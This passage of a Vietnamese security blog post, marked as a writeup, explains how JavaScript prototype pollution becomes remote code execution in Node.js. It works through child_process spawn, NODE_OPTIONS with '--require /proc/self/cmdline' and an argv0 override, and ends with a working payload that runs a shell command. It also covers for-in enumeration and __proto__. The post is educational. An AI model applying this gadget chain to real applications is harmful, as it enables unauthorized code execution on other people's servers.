+</span></span><span class="line"><span class="cl">        <span class="nv">const</span> <span class="nv">value</span> <span class="o">=</span> <span class="nv">env</span><span class="o">[</span><span class="nv">key</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">if</span> <span class="p">(</span><span class="nv">value</span> <span class="o">!==</span> <span class="nv">undefined</span><span class="p">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">envPairs</span><span class="o">.</span><span class="nv">push</span><span class="p">(</span><span class="o">`${</span><span class="nv">key</span><span class="o">}=${</span><span class="nv">value</span><span class="o">}`</span><span class="p">)</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">return</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="nv">Make</span> <span class="nv">a</span> <span class="nv">shallow</span> <span class="nv">copy</span> <span class="nv">so</span> <span class="nv">we</span> <span class="nv">don</span><span class="s">&#39;t clobber the user&#39;</span><span class="nv">s</span> <span class="nv">options</span> <span class="nv">object</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span><span class="nv">options</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">args</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">detached</span><span class="o">:</span> <span class="o">!!</span><span class="nv">options</span><span class="o">.</span><span class="nv">detached</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">envPairs</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">file</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">windowsHide</span><span class="o">:</span> <span class="o">!!</span><span class="nv">options</span><span class="o">.</span><span class="nv">windowsHide</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">windowsVerbatimArguments</span><span class="o">:</span> <span class="o">!!</span><span class="nv">windowsVerbatimArguments</span>
+</span></span><span class="line"><span class="cl">    <span class="o">};</span>
+</span></span></code></pre></div><ul>
+<li>Như ta đã biết vòng for in ở đây sẽ loop qua cả các prototype và dường như điều này đã được các developer intend nhưng mà không hiểu sao lại intend v nữa : )</li>
+<li>Vậy spawn một process mới và kiểm soát được options thì ta có thể làm được gì ? Có một options khá thú vị nếu như ta spawn một <strong>node</strong> process .
+Đó là NODE_OPTIONS : <a href="https://nodejs.org/api/cli.html#node_optionsoptions" target="_blank">https://nodejs.org/api/cli.html#node_optionsoptions</a>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SyeQrpZOll.png" alt="image" />
+    
+  </figure>
+
+Và ta có thể thấy  :
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HymIrpWugx.png" alt="image" />
+    
+  </figure>
+
+Kết hợp điều này với gadget trên thì ta có thể dễ dàng lấy RCE . Vậy làm sao có thể làm được khi ta không có thể tạo file ? Ta có thể lợi dụng các file đặc biệt như /proc/self/environ như ví dụ ở Kibana nhưng điều này đã bị chặn và không còn khả thi  vì node js đã fixx lỗi này và luôn đặt environ ở cuối cùng.</li>
+<li>Vậy là sao để bypass  ?
+Ta sẽ lợi dụng một file đặc biệt là file <strong>/proc/self/cmdline</strong> là file sẽ trả về argv[0] ví dụ  :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ls</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;node&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;rce.js&#34;</span><span class="p">],</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">env</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="c1">// inherit parent env
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">stdio</span><span class="o">:</span> <span class="s2">&#34;inherit&#34;</span>  <span class="c1">// pipe output directly to parent terminal
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span></code></pre></div><p>rce.js :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">cmdline</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&#34;/proc/self/cmdline&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cmdline</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;\0&#34;</span><span class="p">));</span>
+</span></span></code></pre></div><p>Khi này ta sẽ thấy argv[0] tương đương với &rsquo;node&rsquo;  :<br>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/H1byy0b_ee.png" alt="image" />
+    
+  </figure>
+</p>
+<ul>
+<li>Và điều đặc biệt là spawn function có hỗ trợ chức năng set argv[0] mà không làm thay đổi executable file .
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/By5WyR-Oxx.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ls</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;node&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;rce.js&#34;</span><span class="p">],</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">argv0</span><span class="o">:</span> <span class="s2">&#34;abc&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">env</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="c1">// inherit parent env
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">stdio</span><span class="o">:</span> <span class="s2">&#34;inherit&#34;</span>  <span class="c1">// pipe output directly to parent terminal
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HJzVkCZdgg.png" alt="image" />
+    
+  </figure>
+
+Kết hợp điều này với NODE_OPTIONS và /proc/self/cmdline ta có payload như sau  :+1:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ls</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;node&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;rce.js&#34;</span><span class="p">],</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">argv0</span><span class="o">:</span> <span class="s2">&#34;console.log(123);//&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">env</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="c1">// inherit parent env
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">NODE_OPTIONS</span><span class="o">:</span> <span class="s2">&#34;--require /proc/self/cmdline&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">stdio</span><span class="o">:</span> <span class="s2">&#34;inherit&#34;</span>  <span class="c1">// pipe output directly to parent terminal
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/S1hLy0bOxg.png" alt="image" />
+    
+  </figure>
+</p>
+<ul>
+<li>Cuối cùng kết hợp với prototype pollution thì ta sẽ dễ dàng có được rce .</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="p">{};</span> <span class="c1">// dummy object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">&#34;--require /proc/self/cmdline&#34;</span><span class="p">;</span> <span class="c1">// trigger loadJ
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="sb">`require(&#34;child_process&#34;).execSync(&#34;id &gt; pwn&#34;);//`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;node&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SkbvVAZugg.png" alt="image" />
+    
+  </figure>
+</p>
+
+
+<h1 class="relative group">Một vài điểm thú vị về for in : 
+    <div id="m%E1%BB%99t-v%C3%A0i-%C4%91i%E1%BB%83m-th%C3%BA-v%E1%BB%8B-v%E1%BB%81-for-in-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#m%E1%BB%99t-v%C3%A0i-%C4%91i%E1%BB%83m-th%C3%BA-v%E1%BB%8B-v%E1%BB%81-for-in-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Xét ví dụ sau :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">scripts</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pace&#34;</span><span class="o">:</span> <span class="s2">&#34;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;main&#34;</span><span class="o">:</span> <span class="s2">&#34;/main.js&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">polluted</span> <span class="o">=</span> <span class="s2">&#34;WTF&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Just log it out : &#34;</span><span class="p">,</span> <span class="nx">scripts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">script</span> <span class="k">in</span> <span class="nx">scripts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[&#34;</span> <span class="o">+</span> <span class="nx">script</span> <span class="o">+</span> <span class="s2">&#34;] =&gt; &#34;</span> <span class="o">+</span> <span class="nx">scripts</span><span class="p">[</span><span class="nx">script</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Kết quả sẽ có chứa polluted không ? Câu trả lời là có   :
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/H1jr8KJ_gl.png" alt="image" />
+    
+  </figure>
+
+Đọc tí document về tính chất của for in ta có thể thấy rằng <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties" target="_blank">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties</a>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ry2vUFJuxl.png" alt="image" />
+    
+  </figure>
+
+Nó sẽ chấp nhận luôn cả những enumerable là inherited từ Object prototype ! Bài này mình thấy ở malta ctf khá hay  (mặc dù mình k giải ra:( )</p>
+
+
+<h1 class="relative group">So sánh _<em>proto</em>_ và constructor.prototype? 
+    <div id="so-s%C3%A1nh-__proto__-v%C3%A0-constructorprototype" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#so-s%C3%A1nh-__proto__-v%C3%A0-constructorprototype" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Như mọi người ai cũng biết là khi làm prototype pollution ta thường dùng các key như &ldquo;<strong>proto</strong>&rdquo; hay &ldquo;constructor.prototype&rdquo; để access được Object.prototype nhưng vì sao lại như vậy ?</p>
+
+
+<h2 class="relative group">Constructor.prototype : 
+    <div id="constructorprototype-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#constructorprototype-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>Ta có thể hiểu đơn giản là lấy prototype của constructor đó .
+Nhìn vào đoạn code sau :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{}</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Tương</span> <span class="nx">đương</span> <span class="nx">với</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rJeswK1ugl.png" alt="image" />
+    
+  </figure>
+</p>
+<ul>
+<li>Hàm Object.create sẽ tạo một object và sử dụng một Object đang tồn tại làm prototype cho chúng và lưu vào __proto__ .</li>
+<li>Còn constructor là trỏ về object và lấy prootytpe của Object . Nên vô tình sẽ khiến cho __proto__ == Object.prototype</li>
+</ul>
+
+
+<h2 class="relative group">__proto__ 
+    <div id="__proto__" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#__proto__" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>Sẽ có các trường hợp __proto__ sẽ khác với constructor.prototype như :
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rykrdYyOlx.png" alt="image" />
+    
+  </figure>
+</li>
+<li>Ví dụ trên trang chính vậy. Khi này __proto__ == person.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/B1guOY1Oxg.png" alt="image" />
+    
+  </figure>
+</li>
+<li>Còn constructor của nó vẫn là Object nên đơn giản trả về Object prototype
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BJH5Ot1Oxl.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+
+
+<h1 class="relative group">Các method để lấy Prototype 
+    <div id="c%C3%A1c-method-%C4%91%E1%BB%83-l%E1%BA%A5y-prototype" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#c%C3%A1c-method-%C4%91%E1%BB%83-l%E1%BA%A5y-prototype" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li>Cái nì mình tóm tắt trick lỏ lấy được từ X thôi :v
+<a href="https://x.com/arkark_/status/1943260773268230205?s=46" target="_blank">https://x.com/arkark_/status/1943260773268230205?s=46</a>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HyXNttk_lg.jpg" alt="8219bfac-78cd-4b0e-9186-92f075010cd6" />
+    
+  </figure>
+</li>
+</ul>
+
+
+<h1 class="relative group">Resource : 
+    <div id="resource-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#resource-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p><a href="https://nodejs.org/api/cli.html#cli_node_options_options" target="_blank">https://nodejs.org/api/cli.html#cli_node_options_options</a>
+<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof" target="_blank">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof</a>
+<a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/" target="_blank">https://www.sonarsource.com/blog/blitzjs-prototype-pollution/</a>
+<a href="https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf" target="_blank">https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf</a>
+<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+        
+
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/posts/dompurify/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/dompurify/feature_life.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/dompurify/">Some notes on DomPurify</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-07-10T00:00:00&#43;00:00">10 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/cve/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/cve/feature_shit.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/cve/">Rebuild CVE-2025-49113</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-06-12T00:00:00&#43;00:00">12 June 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/pico/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/pico/feature.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/pico/">PicoCTF 2025</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-25T00:00:00&#43;00:00">25 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+</section>
+
+  
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/EJS2RCE\/index.md"
+        var oid_likes = "likes_posts\/EJS2RCE\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/dompurify/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Some notes on DomPurify</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-07-10T00:00:00&#43;00:00">10 July 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/prototypegadget/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >New PP2RCE Gadget</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-08-19T00:00:00&#43;00:00">19 August 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
